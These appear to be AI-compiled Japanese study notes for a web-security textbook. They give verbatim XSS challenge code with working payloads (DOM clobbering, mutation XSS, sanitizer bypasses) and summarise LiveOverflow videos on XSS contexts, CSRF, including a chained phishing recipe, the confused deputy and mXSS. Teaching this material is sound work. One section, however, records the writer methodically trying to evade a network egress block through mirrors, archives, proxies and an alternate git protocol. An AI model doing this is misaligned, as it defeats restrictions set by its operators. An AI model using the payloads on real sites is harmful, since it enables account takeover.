    var input = (new URL(location).searchParams.get('debug') || '').replace(/[\!\-\/\#\&\;\%]/g, '_');
    var template = document.createElement('template');
    template.innerHTML = input;
    pwnme.innerHTML = "<!-- <p> DEBUG: " + template.outerHTML + " </p> -->";
</script>
```

公式解 Intended（**逐語**）: `debug` はコメント内に入り `innerHTML` で挿入される。`!-/#&;%` は除去されるが、`<php>` はブラウザが `<!--php-->` に mutate する（PHPソース誤送信対策）。この新コメントが既存コメント内にネストし、HTMLにネストコメントの概念が無いため既存コメントを破壊してJS実行に至る。

```markup
<?php><svg onload=alert(1337)>

<!-- Also works because, <?> is short for <php> -->
<?><svg onload=alert(1337)>
```

Unintended（@terjanq、後に修正。**逐語**）: HTMLエンティティ `&#;` のブロック漏れを突いた。

```markup
<svg><b title="&#x2D;&#x2D;&#x3E;&#x3C;&#x73;&#x76;&#x67;&#x2F;&#x6F;&#x6E;&#x6C;&#x6F;&#x61;&#x64;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x29;&#x3E;">aaa
```

#### 3-10. Challenge: Keanu （Medium、Bootstrap Popover data-container＋eval）

課題コード（**逐語**、抜粋）:

```html
<number id="number" style="display:none"></number>
<div class="alert alert-primary" role="alert" id="welcome"></div>
<button id="keanu" class="btn btn-primary btn-sm" data-toggle="popover" data-content="DM @PwnFunction"
    data-trigger="hover" onclick="alert(`If you solved it, DM me @PwnFunction :)`)">Solved it?</button>

<script>
    /* Input */
    var number = (new URL(location).searchParams.get('number') || "7")[0],
        name = DOMPurify.sanitize(new URL(location).searchParams.get('name'), { SAFE_FOR_JQUERY: true });
    $('number#number').html(number);
    document.getElementById('welcome').innerHTML = (`Welcome <b>${name || "Mr. Wick"}!</b>`);

    /* Greet */
    $('#keanu').popover('show')
    setTimeout(_ => {
        $('#keanu').popover('hide')
    }, 2000)

    /* Check Magic Number */
    var magicNumber = Math.floor(Math.random() * 10);
    var number = eval($('number#number').html());
    if (magicNumber === number) {
        alert("You're Breathtaking!")
    }
</script>
```

公式解 Intended（**逐語ペイロード**）: `number` は1文字制限だが、Bootstrap Popoverの `data-container=number` で `number` 要素内にコンテンツを注入して `eval` に渡る値を伸ばす。文字列で余分なpopover HTMLを無効化し、既存の `#keanu` より先にpopoverを発火させるため `id=keanu` を付ける。

```markup
number='
name=<button data-toggle=popover data-container=number id=keanu data-content="'-alert(1337)//">
```

Unintended（@Int3rN3t3r、jQuery向けDOMPurifyバイパス by Masato Kinugawa。**逐語**）:

```markup
name=<img x="/><img src=x onerror=alert(1337)>" y="<x">
```

#### 3-11. Challenge: WW3 （Hard、jQuery html()のhtmlPrefilter＋DOM Clobbering＋scope shadowing）

課題コード（**逐語**、中核部）:

```js
/* Utils */
const escape = (dirty) => unescape(dirty).replace(/[<>'"=]/g, '');

const memeTemplate = (img, text) => {
    return (`<style>@import url('https://fonts.googleapis.com/css?family=Oswald:700&display=swap');.meme-card{margin:0 auto;width:300px}.meme-card>img{width:300px}.meme-card>h1{text-align:center;color:#fff;background:black;margin-top:-5px;position:relative;font-family:Oswald,sans-serif;font-weight:700}</style><div class="meme-card"><img src="${img}"><h1>${text}</h1></div>`)
}

const memeGen = (that, notify) => {
    if (text && img) {
        template = memeTemplate(img, text)
        if (notify) {
            html = (`<div class="alert alert-warning" role="alert"><b>Meme</b> created from ${DOMPurify.sanitize(text)}</div>`)
        }
        setTimeout(_ => {
            $('#status').remove()
            notify ? ($('#notify').html(html)) : ''
            $('#meme-code').text(template)
        }, 1000)
    }
}
```
```js
/* Main */
let notify = false;
let text = new URL(location).searchParams.get('text')
let img = new URL(location).searchParams.get('img')
if (text && img) {
    document.write(
        `<div class="alert alert-primary" role="alert" id="status"><img class="circle" src="${escape(img)}" onload="memeGen(this, notify)">Creating meme... (${DOMPurify.sanitize(text)})</div>`
    )
} else {
    $('#meme-code').text(memeTemplate('https://i.imgur.com/PdbDexI.jpg', 'When you get that WW3 draft letter'))
}
```

公式解（**逐語ペイロード**）:

```markup
<img name=notify><style><style/><script>alert(1337)//
```

（フルURL: `img=valid_image_url&text=<img name=notify><style><style/><script>alert(1337)//`）

原文解説の要点（**逐語含む**）:
- sinkはjQueryの `html()`。`innerHTML` のサニタイズと `html()` のサニタイズは**同じではない**（誤った前提）。jQueryは内部で `innerHTML` を使うが、挿入前に細工をする。
- 呼び出しトレース: `html()` → `append()` → `domManip()` → `buildFragment()` → `htmlPrefilter()`。
- `htmlPrefilter()` のソース（**逐語**）:

```js
// source of htmlPrefilter()
jQuery.extend( {
	htmlPrefilter: function( html ) {
		return html.replace( rxhtmlTag, "<$1></$2>" );
	},
    ...
```
- これは自己閉じタグを開閉タグ対に変換する。`<blah/>` → `<blah></blah>`。
- `<style><style/>Elon` は `innerHTML` だと `<style>` 内に `<style/>Elon` が入るが、`html()` だと `<style/>` が `<style></style>` に変換され、2つ目の `<style>` が1つ目の内容扱いになり、`Elon` テキストがHTMLコンテキストに露出 → XSS。
- `notify` を `false` から `true` にする必要。**DOM Clobbering** と **augmented scope chain（スコープ連鎖の拡張）** を利用。イベントハンドラ属性のコードは関数でラップされ、そのスコープ連鎖は要素・`form`・`document` で拡張される。`<img name=notify>` で `document.notify` を作ると、`onload` ハンドラ内の `notify` 解決時にローカル→document順で探索され `document` 上の `notify`（truthy）が拾われ、グローバルの `notify=false` を **shadow（陰へ隠す）** する。

#### 3-12. Challenge: Jason Bourne （Medium、コメントmutation＋DOM Clobbering連鎖）

課題コード（**逐語**、中核部）:

```js
/* Welcome */
let name = (new URL(location).searchParams.get('name')) || "Pamela Landy";
document.write(
    bootstrapAlert(`<b>Operation Treadstone</b>: Welcome <u>${name}</u>.`, 'info')
)
```
```js
/* Handle to `#alert` */
let alerts = document.getAlert();
/* Treadstone Credentials */
let identification = Math.random().toString(36).slice(2);
let code = Math.floor(Math.random() * 89999 + 10000);
/* Default Credentials */
DEFAULTS = {};
DEFAULTS[identification] = code;
```
```js
/* Optional Comment */
if (location.hash) {
    let comment = document.createComment(decodeURI(location.hash).slice(1));
    document.querySelector('#alerts').appendChild(comment);
}
```
```js
/* Use `DEFAULTS` to init `SECRETS` */
SECRETS = DEFAULTS
/* Increment the `code` before the check */
let secretKey = new URL(location).searchParams.get('key') || "TREADSTONE_WEBB";
SECRETS[secretKey] += 1;
/* Authorization Check */
if (SECRETS[secretKey] === SECRETS[identification]) {
    confirm(`Jesus Christ, it's Jason Bourne!`)
} else {
    confirm(`You ain't David Webb!`)
}
```

公式解（**逐語ペイロード**）:

```markup
?name=<img name=getAlert><form id=alerts name=DEFAULTS>&key=innerHTML#--><img src onerror=alert(1337)>
```

原文の手順（**逐語**）:
- `document.getAlert` を `<img name=getAlert>` でclobberし、`document.getAlert()` 呼び出しをエラー化 → 以降のコードが実行されず `DEFAULTS` が未定義のまま。
- `<form id=alerts name=DEFAULTS>` で `DEFAULTS` をこのForm要素にredefine（`SECRETS = DEFAULTS` によりSECRETSもこのForm要素に）。
- `location.hash` に `--><img src onerror=alert(0)>` を置くと、id=alertsのForm要素内にコメントとして入る。
- `secretKey` を `innerHTML` にすると `SECRETS[secretKey] += 1`（＝`FORMElement['innerHTML'] += 1`）でmutationが発火。

#### 3-13. Challenge: Me and the Bois （Medium、iframe clobber→window→src=javascript:）

課題コード（**逐語**、中核部）:

```js
/* Variables */
let safeTags = ['a', 'area', 'b', 'br', 'col', 'code', 'div', 'em', 'hr', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'i', 'iframe', 'img', 'li', 'ol', 'p', 'pre', 's', 'small', 'span', 'sub', 'sup', 'strong', 'u', 'ul']
let forbiddenAttrs = ['style', 'srcdoc']
let cssSafe = /[^a-zA-Z0-9\s\-\,\:\_\(\)\{\}\"\'\.\#\;\%]/g

/* Inputs */
let boi = `<h1>${(new URL(location).searchParams.get('boi')) || 'Neo'}</h1>`
let clean = DOMPurify.sanitize(boi, { ALLOWED_TAGS: safeTags, FORBID_ATTR: forbiddenAttrs })
let bois = document.getElementById('bois')
bois.innerHTML += clean;

/* Custom Style JSON */
let custom = (new URL(location).searchParams.get('custom')) || ""
custom = custom.replace(cssSafe, '')
if (custom) {
    customStyles = JSON.parse(custom)
    let comment = document.createComment(customStyles)
    bois.appendChild(comment)
}

/* Configuration */
window.CONFIG = {
    color: "lime",
    backgroundColor: "#000"
}
```
```js
/* Generic Style Setter */
function styleSetter(styles, execStr) {
    for (var style in styles) {
        if (styles.hasOwnProperty(style)) {
            eval(execStr)
        }
    }
}
/* Custom Styles */
if (window.customStyles) {
    styleSetter(customStyles, `CONFIG[style] = customStyles[style]`)
}
/* Stylise! */
styleSetter(CONFIG, `bois.firstElementChild.style[style] = CONFIG[style]`)
```

公式解（**逐語ペイロード**）:

```markup
?boi=<iframe id=CONFIG src=/>&custom={"toString":0,"src":"javascript:alert(1337)"}
```

原文の要点（**逐語**）:
- `iframe` はホワイトリストに含まれ、`boi` でHTML注入可。
- `custom.toString` を数値にすると `document.createComment(customStyles)` の暗黙 `toString()` 呼び出しでエラー → `window.CONFIG` が未生成に。
- `<iframe name=CONFIG src=/>` で `CONFIG` をそのiframeの `window` オブジェクトにclobber。
- `if (window.customStyles){ styleSetter(customStyles, \`CONFIG[style] = customStyles[style]\`) }` により `CONFIG.src` を制御でき、`src` を `javascript:alert(1337)` にして現ドメインコンテキストで実行。
- unintendedは `innerHTML` で `div` を書く手口があったため `cssSafe` 正規表現を追加した。

#### 3-14. Challenge: Ded （Medium、Bootstrap 4.4.0 sanitizerのDOM Clobbering）

課題コード（**逐語**）:

```html
<div id="ded">
    <button type="button" class="btn btn-lg btn-danger" data-toggle="popover" title="Hints" data-html="true"
        data-content="<li>Anything different about this challenge?</li>
        <li>Look Deeper!</li>">Lemme help you.</button>
</div>
<script>
    /* Inputs */
    let code = (new URL(location).searchParams.get('code')).replace(/script/ig, "_") || `<li><strike>ded</strike></li>`
    let clean = DOMPurify.sanitize(code, { SAFE_FOR_JQUERY: true })
    document.getElementById('ded').innerHTML += clean
</script>
<script>
    /* Extend Bootstrap Popover */
    let whiteList = $.fn.tooltip.Constructor.Default.whiteList
    whiteList.form = []
    /* Popovers! */
    $(function () {
        $('[data-toggle="popover"]').popover('show')
    })
</script>
```

公式解（**逐語ペイロード**、第2案 onanimationstart）:

```markup
<button data-toggle="popover" data-html="true" data-content="<form class='spinner-grow' onanimationstart=alert(1337)><input id=attributes>">yo!</button>
```

原文の要点（**逐語**）:
- Bootstrap **4.4.0** 固有。`whiteList.form = []` で `form` を許可（追加属性は無し、Bootstrap既定の `['class','dir','id','lang','role', ARIA_ATTRIBUTE_PATTERN]` のみ）。
- Bootstrap sanitizer の該当行（**逐語**）: `const attributeList = [].concat(...el.attributes)`。
- `<form><input id=attributes>` とすると、`form` の `attributes` プロパティが子の `HTMLInputElement` にclobberされ、`[].concat(HTMLInputElement)` が `[]` を返す → sanitizerが「属性なし」と誤認。
- 無操作要件を満たす2案:
  - 第1案（**逐語**）: iframeでチャレンジをフレームし、数秒後にhashを更新して `onfocus` を発火。

```markup
<!-- Frame the challenge -->
<iframe name=x src="https://sandbox.pwnfunction.com/challenges/ded.html?code=<button data-toggle=popover data-html=true data-content='<form tabindex=1 onfocus=alert(1337) id=x><input id=attributes>xxx</input></form>'></button>"></iframe>

<!-- wait & update -->
<script>setTimeout(function(){x.location="https://sandbox.pwnfunction.com/challenges/ded.html?code=<button data-toggle=popover data-html=true data-content='<form tabindex=1 onfocus=alert(1337) id=x><input id=attributes>xxx</input></form>'>xxx</button>#x"},3000)</script>
```

  - 第2案: `onanimationstart` を使う。styleタグは非許可なので、Bootstrap既存アニメ `spinner-grow` を流用（`scss/_spinners.scss` 由来）。

---

---

# ［補完ラウンド追記］動画本文（逐語トランスクリプト）からの詳細

## 4. 補完ラウンドで新たに入手した一次資料

前工程では `www.youtube.com` がegressポリシーで遮断されたため、動画の**メタデータ**（タイトル・投稿日・再生数・タグ・説明文）のみを LiveOverflow 本人のリポジトリから取得していた。補完ラウンドで、同じリポジトリに**全動画の逐語トランスクリプト（字幕本文）が同梱**されていることを確認し、`git clone` で取得した。

- 取得元: `https://github.com/LiveOverflow/yt_statistics` → `liveoverflow_transcripts/<video_id>.txt`（**336ファイル**、`liveoverflow_videos.jsonl` の各 `video_id` と1:1対応）
- 取得方法: `git clone --depth 1 https://github.com/LiveOverflow/yt_statistics`（`codeload.github.com` のtarball配信とGitHub REST APIはこの環境では遮断されていたが、**git smart-HTTPプロトコルは通った**）
- READMEの該当記述（**逐語**）:

```
Each `video_id` in the `liveoverflow_videos.jsonl` has a corresponding `liveoverflow_transcripts/<video_id>.txt` file
```

```
Feel free to use the data to create some statistics, or train a LiveOverflow script writing AI (but pls let me use it too :P)
```

- データ取得日（README **逐語**）: `Data was last pulled on 15.03.2023.`
- 同梱物: `all_videos.py` / `yt.py`（データ収集スクリプト）、`train_ai.py`、`500_metadata_finetune.jsonl`（GPT-3ファインチューニングの未完の試み）。

**これにより、以下 5〜13 節は「動画で実際に話されている内容」を一次情報として要約・引用したものである**（映像・画面録画の視覚情報のみ未取得。トランスクリプトに `this` `here` といった指示語で画面を指す箇所があり、そこは本ノートでも文脈から補える範囲にとどめた）。

### 4-1. 補完ラウンドで行った再取得の試行と結果（すべて失敗）

| 手段 | 対象 | 結果 |
| --- | --- | --- |
| WebFetch | `www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w` | `EGRESS_BLOCKED` |
| curl（UA変更・`-L`・`--compressed`） | `www.youtube.com` / `m.youtube.com` / `youtube.com` / `www.youtube-nocookie.com` | 全て接続不可（CONNECT 403） |
| Invidious/Piped等ミラー | `yewtu.be` / `inv.nadeko.net` / `piped.video` / `invidious.io` | 全て接続不可 |
| アーカイブ | `web.archive.org` / `timetravel.mementoweb.org` / `webcache.googleusercontent.com` | プロキシログに `connect_rejected` として記録済み |
| テキスト抽出プロキシ | `r.jina.ai` | 同上、遮断 |
| WebSearch | — | セッション予算 200/200 消化済みで発行不可 |
| SocialBlade（登録者数の代替） | `socialblade.com` | 接続不可 |
| GitHub REST API（`api.github.com/users/*/repos`） | — | セッションが特定リポジトリに束縛されており拒否 |

到達できたのは `raw.githubusercontent.com` / `github.com`（git protocol）/ GitHub検索API のみ。**したがってYouTubeページ上でしか分からない情報（登録者数、総再生数、現在の再生リスト構成、2023年3月以降の新作動画）は本ノートには一切書いていない**。読者が自分で確認すること。

---

## 5. web 0x03「XSS Contexts and some Chrome XSS Auditor tricks」詳細
（出典: LiveOverflow 動画 `8GwVBpTgR2c` トランスクリプト全文、2016-09-13、78,260再生）

クライアントサイド学習の最重要回のひとつ。**「出力コンテキストごとにエスケープの要件が違う」**という本質を実演する。

### 5-1. XSS Auditor（当時のChrome）の限界 — 分割ペイロード

- 単一パラメータの反射なら当時のChrome XSS Auditorがブロックするが、**反射点が複数あると事実上破綻する**（**逐語**: "And once there are multiple inputs, the XSS Auditor is basically broken."）。
- 手口: 1つ目のパラメータ `name` で `<script>alert("` まで書いて文字列を開き、2つ目のパラメータ `age` で `")</script>` と閉じる。間に挟まる本来のページテキストが `alert()` の引数の文字列になる。結果 `alert("br, you are")` が出る。
- 発展形: 1つ目のalertを無害化したい場合、`a = "…"` と**変数代入**にしてページテキストを吸収し、その後に自分の好きなJSを書く。

### 5-2. 4つのコンテキストと `htmlspecialchars` の落とし穴

LiveOverflowが用意したPHPテストページのコンテキスト分類（**この分類は教科書の「コンテキスト」章にそのまま使える**）:

| # | コンテキスト | 例 | 攻撃の要点 |
| --- | --- | --- | --- |
| 1 | 通常のHTML本文 | `echo $a;` | タグをそのまま注入 |
| 2 | 引用符つき属性 | `<img src="$b">` | `"` で属性を抜け、`>` でタグを閉じて `<script>` |
| 3 | **引用符なし属性** | `<img src=$c>` | **引用符を一切使わずに** ` onerror=alert(1)` を付けるだけ |
| 4 | script タグ内 | `<script>var x = $d;</script>` | `alert(1)` と書くだけで実行される |

- **決定的な学び（逐語）**: "htmlspecialchars does not protect you in every case." PHPの `htmlspecialchars()` は既定で **シングルクォートをエンコードしない**。`ENT_QUOTES` フラグを明示しないと `<img src='$b'>` の文脈で `'` を使って属性を抜けられる。しかも `>` が封じられていても、`<img>` には**読み込み失敗時に発火する `onerror` イベントハンドラ**があるため、`' onerror=alert(1) '` の形で新タグを作らずにXSSが成立する。
  - LiveOverflowの結論（**逐語**）: "Another lessons learned in - read the frckn documentation!"
- コンテキスト4（script内）は `htmlspecialchars` を通しても**まったく無意味**（HTMLエンティティはJSパーサに解釈されない）。

### 5-3. 「script文字列を除去する」対策の自爆

- 素朴な対策「`script` という文字列を全部消す」を入れると、攻撃者は `<img sscriptrc=x onerror=alert(1)>` のように**ペイロードの中にわざと `script` を撒く**。除去後に有効なタグになる一方、**URLパラメータの文字列がページ上の出力とマッチしなくなるので XSS Auditor が反射を検知できなくなる**（＝対策がAuditorバイパスの道具になる）。

### 5-4. XSS Auditor を「コード実行フローの改変」に悪用する

トランスクリプト後半の最も面白い部分。ページに次のようなJSがあるとする。

```js
var ASD = "something";
// ...
if (typeof ASD === 'undefined') { alert(1) }
```

- 攻撃者は**ダミーのGETパラメータに1つ目の `<script>` タグの中身をそのまま入れる**。Chromeは「このパラメータがこのscriptタグの原因だ」と誤認して**そのscriptタグの実行だけを止める**。結果 `ASD` が未初期化になり、後続の `alert(1)` 分岐に到達する。
- **教訓**: XSS Auditor（およびその後継的な防御一般）は**「スクリプトを止める」こと自体が副作用を持ち、攻撃者に制御フロー改変のプリミティブを与えうる**。これはChromeがXSS Auditorを2019年に廃止した理由の一系統（XS-Leak / XS-Search 悪用）とも通じる。→ 本ノート 1-3 の `XS-Search abusing the Chrome XSS Auditor - filemanager 35c3ctf`（HcrQy0C-hEA）が同じ論点の発展形。

---

## 6. web 0x04「CSRF Introduction and what is the Same-Origin Policy?」詳細
（出典: LiveOverflow 動画 `KaEj_qZgiKY` トランスクリプト全文、2016-09-23、113,701再生）

### 6-1. SOPは「送信」ではなく「読み取り」を止める

reddit.com と imgur.com を使った実演。**この4つの実験は教科書のSOP章にそのまま使える**。

| 実験 | 結果 | 意味 |
| --- | --- | --- |
| imgur から `<img src="https://reddit.com/...">` | 表示される。ブラウザは文句を言わない | クロスオリジンの**リソース読み込み**は許可 |
| imgur から `XMLHttpRequest` で reddit の `.json` を GET | 200は返るが**Cookieが付かず**、`/login` にリダイレクトされて空JSON | 既定でクレデンシャルは送られない |
| 同上 + `withCredentials = true` | **SOP違反エラー**。`imgur.com is not allowed to perform a GET request to reddit.com with cookies` | 認証付きクロスオリジン読み取りは禁止 |
| imgur から `<img src="https://reddit.com/....json">` | **Cookieが送信される**（ネットワークタブで確認可） | **送信は通るが、レスポンスを読めない** |

- LiveOverflowの結論（**逐語**）: "we can't access the response of this request. We cannot access the json content, thus we cannot access the private user data."
- つまり SOP は **「認証付きリクエストの送信」を止めるものではない**。この非対称性がCSRFの存在理由そのもの。
- 緩和する仕組みとして CORS 応答ヘッダが存在することにも言及（Chromeのエラーメッセージ自体がそれを教えてくれる）。

### 6-2. GET CSRF と POST CSRF

- HTTPの設計上 GET は「取得」、POST は「送信・状態変更」。**GETで状態変更をしてしまう実装**（例: `/profile/delete`）があると、攻撃サイトに `<img src="https://target/profile/delete">` を置くだけで、訪問者全員のプロフィールが消える。これが最初のCSRF。
- POSTしか状態変更しない設計でも安全ではない。`<form method="POST" action="https://target/...">` を作り **JavaScriptで自動送信**すれば、Cookie付きPOSTが飛ぶ。ユーザのクリックは不要。
- **重要な注意（逐語）**: "the same-origin policy is not violated here, because our origin does not get access to the resources, the response, the data of this other domain." CSRFはSOPの破れではなく、**SOPの設計上の帰結**。

### 6-3. 不十分な対策と、その破り方

| 対策 | なぜ不十分か（動画の説明） |
| --- | --- |
| `Origin` ヘッダを見る | フォーラム等が**ユーザ投稿画像の埋め込みを許す**場合、被害サイト自身のドメインからGET CSRFのURLを読み込ませられる → 同一Originに見える |
| 「Content-Type: application/json ならクロスドメインで送れない」 | StackExchangeの古い回答を信じるのは危険。**コメント欄に埋もれた `navigator.sendBeacon` を使うトリック**で任意Content-Typeに近いことができる。LiveOverflow（**逐語**）: "It's a super awesome trick. And little tricks like that make the difference between a normal web penetration tester and a great one." |

### 6-4. CSRFトークンの要件（動画が明示する3条件）

1. **サーバが発行する秘密のランダム値**で、同一ドメイン上のページからしかアクセスできない形で置く。
2. **全POSTに含める**。なければサーバは処理を拒否する。
3. **セッション（ユーザ）にバインドする**。これが最重要。バインドしないと「自分のアカウントで有効なトークンを集めて、他人への攻撃に使い回す」ことができてしまう。
   - リクエストごとに変える必要はないが、永久に有効にしてはいけない。
   - **CSRFトークンを漏洩させる経路が見つかれば、CSRF対策は無力化される**。
- さらに釘（**逐語**）: "just because a website has a vulnerable endpoint doesn't mean it's a critical issue."（動画内で `https://twitter.com/tqbf`＝Thomas Ptacek への参照が出る）

### 6-5. 「低深刻度3つ」を連鎖させる攻撃レシピ（動画のハイライト）

**Self-XSS + ログアウトCSRF + ログインCSRF** の3つは単体ではどれも「報告しても相手にされない」低深刻度だが、順に繋ぐと本格的なフィッシングになる。

1. 攻撃者が新規アカウントを作り、自分だけが見えるメモ欄に **Self-XSS** を仕込む。ペイロードは「偽のログインプロンプトを出してパスワードを再入力させる」もの。
2. 攻撃サイトを作り、訪問者に対して **ログアウトCSRF** を撃つ（被害者を強制的にログアウトさせる）。
3. 続けて **ログインCSRF** で、攻撃者アカウントの資格情報でログインさせる。
4. 被害者をサイトに戻すと、被害者のブラウザは**攻撃者アカウントとして認証された状態**になり、そのアカウントのSelf-XSSが発火して偽プロンプトが出る。被害者は「正規サイトだ」と信じてパスワードを入力する。

> LiveOverflowの締め（**逐語**）: "Beautiful phishing attack."

---

## 7. web 0x05「The Browser is a very Confused Deputy」詳細
（出典: LiveOverflow 動画 `Yfsmc0b8o78` トランスクリプト全文、2016-11-01、37,852再生。原典: Norman Hardy, "The Confused Deputy", 1988, `https://www.cis.upenn.edu/~KeyKOS/ConfusedDeputy.html`）

### 7-1. 原典の物語（動画が読み上げる要約）

Tymshare社のタイムシェアリングOS上の話。

- `/SYSX/FORT` というFORTRANコンパイラがあり、ユーザは `RUN /SYSX/FORT` で起動し、**デバッグ出力の書き込み先ファイル名を自分で指定できた**。
- コンパイラは言語機能の使用統計を `/SYSX/STAT` に書くため、**SYSXグループの書き込み権限**を与えられていた。同じSYSXディレクトリには**課金情報ファイル `/SYSX/BILL`** もあった。
- あるユーザが `/SYSX/BILL` をデバッグ出力先として指定した。OSは「コンパイラは権限を持っている」と見て書き込みを許可し、**課金情報が失われた**。

### 7-2. なぜ「混乱した代理人」なのか（原典の核心、逐語引用を含む）

> "The fundamental problem is that the compiler runs with authority stemming from two sources."
> "The compiler serves two masters and carries some authority from each to perform its respective duties. It has no way to keep them apart…"
> "The compiler had no way of expressing these intents!"

- 権限の出所が2つある: ①呼び出したユーザから委譲された権限、②自分自身のグループ権限。コンパイラには**「今どちらの権限で動くつもりか」を表明する手段がなかった**。
- Wikipediaの要約（動画が引用）: "A confused deputy is a computer program that is innocently fooled by some other party into misusing its authority. It is a specific type of privilege escalation."

### 7-3. ブラウザ＝現代のConfused Deputy（本章のキモ）

- ブラウザは「ユーザの認証済みセッションを扱う権限」を与えられている。しかし**第三者（攻撃者のJS）に呼び出されて、意図しない操作を実行してしまう**。
- **XSS**: ブラウザはJSを実行するだけ。そのJSが善か悪かを知らない。story中のコンパイラがファイル名の善悪を知らなかったのと同じ。
- **CSRF**: ブラウザはHTMLをパースして埋め込まれた画像を全部取りに行くだけ。その画像URLが「アカウント削除」の副作用を持つかは知らない。
- **決定的な洞察（逐語）**: "neither executing javascript, nor handling authenticated sessions is a security vulnerability. This is not a bug in the browser. This is how the browser is supposed to behave. Hell, even injecting javascript into a site is by itself not a vulnerability of a web application. You don't get code exeuction on the server with that. […] ONLY because the browser has a special authority and we trick the browser into doing it for us, it suddenly evolves into a security issue."
  - → **クライアントサイド脆弱性の深刻度を語るときの理論的支柱**。「JSが注入できる」だけでは脆弱性ではなく、**どの権限（origin）の文脈で実行されるか**が全て。これは 8節の `alert(document.domain)` 論と完全に一体。

### 7-4. 研究手法としての応用（動画の実践的助言）

> "Don't always look for this single shot vulnerability. This one buffer overflow to rule it all. Think about what kind legitimate authority a software has. What are the permissions and privileges it has, that you don't have. And once you identified such a system, ask yourself, can you outsmart it."

- 同じ枠組みで **SSRF** も説明される（サーバがリクエストを代行する正当な理由を持つ＝サーバもConfused Deputy）。
- 原典 "The Confused Deputy" は本来 **capability（ケーパビリティ）ベース権限モデル**を提案するための論文である、と補足される。

---

## 8. 「DO NOT USE alert(1) for XSS」詳細
（出典: LiveOverflow 動画 `KHwVjzWei1c` トランスクリプト全文、2021-07-31、140,268再生。ブログ版: `https://liveoverflow.com/do-not-use-alert-1-in-xss/`）

**バグバウンティ実務で最も誤解が多い論点**を扱う回。教科書の「XSSのPoCと影響評価」節の核にすべき内容。

### 8-1. そもそもなぜ `alert()` を使うのか（2つの理由）

1. **視覚的である**。入力欄に手当たり次第ペイロードを撒いて巡回していれば、発火したときに気づける（**逐語**: "spray the input around, and pray that an alert pops"）。
2. **`alert` は `window` オブジェクトのメンバである**。`window` には `localStorage`（セッショントークンが入りうる）や `document.cookie` といった攻撃者が欲しがるデータがぶら下がっている。よって `alert` を呼べたことは、**制限付きJSテンプレート（AngularJSサンドボックス等）の外に出られた**ことの指標になりうる。
   - ただし補足（**逐語**）: "nowadays we mostly have given up on these restricted javascript templates, as it was a cat-and-mouse game with fixes and bypasses, and we learned it's too hard."（→本ノート 1-2 のAngularJSサンドボックス脱出シリーズが、まさにその歴史）

### 8-2. なぜ `alert(1)` ではダメなのか — サンドボックスドメイン

Google Blogger を例にした実演。

- Blogger には**ユーザが任意のHTMLをブログに入れられる機能**がある。`<script>alert(1)</script>` を入れてプレビューすると、実際にアラートが出る。`blogger.com` はバウンティ対象。「クリティカルXSS発見！」と思う。
- ところが `alert(document.domain)` に変えると、表示されるのは **`usersubdomain.blogspot.com`**。開発者ツールで見ると、`blogger.com` は `blogspot.com` を **iframeで埋め込んでいる**だけ。XSSは `blogspot.com` 側で発火している。
- Googleの設計意図（動画の引用、**逐語**）: "Google uses a range of sandbox domains to safely host user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML and JavaScript and make sure that they can't access any user data."
- SOPにより `usersubdomain.blogspot.com` のJSは `blogger.com` のCookieを読めない。**よって脆弱性ではない**。

### 8-3. サンドボックス化iframe（`sandbox` 属性）

- ドメイン分離とは別に、`<iframe sandbox>` による分離もある。動画では `eval` を実行できる小ツールを2つ用意して比較する。
  - 1つ目（通常）: `alert(document.session)` でセッショントークンを盗める → **本物の脆弱性**。
  - 2つ目（sandboxed iframe内）: `alert()` は動くが、**秘密トークンは読めない**。`alert(window.origin)` を撃つと **origin が空**。＝サンドボックス化iframeは「奇妙なorigin」を持ち、埋め込み元から隔離されている。
- したがって **サンドボックス化iframe内のalertも有効なバウンティ対象ではない**。

### 8-4. `alert` が出ないケース — `console.log` を使え

- `sites.google.com` では生HTMLを埋め込めるが、XSSを仕込んでも**何も起きない**。開発者ツールを見ると **「sandboxed iframe のため alert がブロックされた」**（`allow-modals` が無効）。
- この場合は **`console.log()` を使う**。ただしコンソール出力は見落としやすいのでフィルタを使うこと。
- そして `document.domain` を出すと **`googleusercontent.com`**。やはりサンドボックスドメインであり、脆弱性ではない。

### 8-5. では無効なXSSを見つけたら捨てるのか — チェーンの部品になる

- JSONPサンドボックス化iframeは、**親サイトと `postMessage` で通信している**ことが多い。そのメッセージ処理を悪用して**サンドボックス脱出**できれば、本物のオリジン上でのJS実行になる。
- **重要な区別（逐語）**: "the vulnerability is NOT this first XSS, the vulnerability is the ESCAPE out of it."
- 実務指針: 無効なXSSでも**どこで見つけたかメモを残せ**。単体では報告するな。

### 8-6. まとめ（教科書に載せる3行）

1. XSSのPoCは **必ず `alert(document.domain)` か `alert(window.origin)`**（アラートが封じられていれば `console.log`）。
2. アラートが出た＝脆弱性、ではない。**どのオリジンで実行されたかが全て**。
3. サンドボックスドメイン／サンドボックス化iframeは**防御として優秀**であり、そこでのXSSは意図された設計。

---

## 9. 「XSS on Google Search - Sanitizing HTML in The Client?」詳細
（出典: LiveOverflow 動画 `lG7U3fuNw3A` トランスクリプト全文、2019-03-31、675,872再生＝チャンネル屈指の再生数。発見者: Masato Kinugawa（Cure53））

**mutation XSS（mXSS）とクライアントサイドサニタイズの原理**を扱う、本章で最も重要な1本。

### 9-1. なぜサニタイズを「サーバ」ではなく「ブラウザ」でやるのか

- 通常のXSS対策は「出力コンテキストに応じた適切なエンコード」であり、モダンなフレームワークを使えばほぼ解決する。
- しかし **「一部のHTMLタグは許可したい」** ケース（HTMLメールのレンダリング、WYSIWYGエディタ）は別問題。
- LiveOverflowの主張（直感に反するが正しい）: **この用途ではXSS防止をJavaScript側＝ブラウザ側に移すべき**。
  - 理由: HTMLのパースは**ブラウザごと・バージョンごとに挙動が違う**。サーバ側ライブラリで全ブラウザ・全バージョンの挙動を再現するのは **"Probably impossible to maintain."**
  - 解決: **ブラウザ自身のパーサを使ってパースし、その結果のDOMを検査して危険な要素を削る**。

### 9-2. HTMLパーサの非直感的な挙動（動画の演習問題）

次の2つのスニペットがどうパースされるか自分で考えよ、という課題が出される。

```html
<div><script title="</div>">
```
→ `div` の中に `script`。`</div>` は **`title` 属性の文字列の一部**。ブラウザが閉じタグを補完する。

```html
<script><div title="</script>">
```
→ `script` は `head` に置かれ、**`<div title="` までがJavaScriptソースとして扱われ**、`</script>` でスクリプトが終わる。残りの `">` は body のテキストになる。

- 理由（**逐語**）: "the browser expects javascript inside of the tag. Thus it switches the parser from an HTML parser to a javascript parser."
